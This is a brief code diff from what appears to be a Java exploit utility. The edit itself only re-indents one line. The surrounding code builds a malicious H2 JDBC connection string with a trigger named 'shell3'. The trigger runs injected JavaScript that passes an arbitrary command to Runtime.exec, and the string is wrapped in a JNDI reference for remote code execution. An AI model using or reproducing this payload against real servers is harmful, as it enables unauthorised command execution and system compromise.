@@ -9,7 +9,7 @@ public class jdbcutils {
         String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                 "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                 "java.lang.Runtime.getRuntime().exec('" + cmd + " ')\n" +
-        "$$\n";
+                "$$\n";
         ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
         ref.add(new StringRefAddr("url", JDBC_URL));
         ref.add(new StringRefAddr("username", "root"));
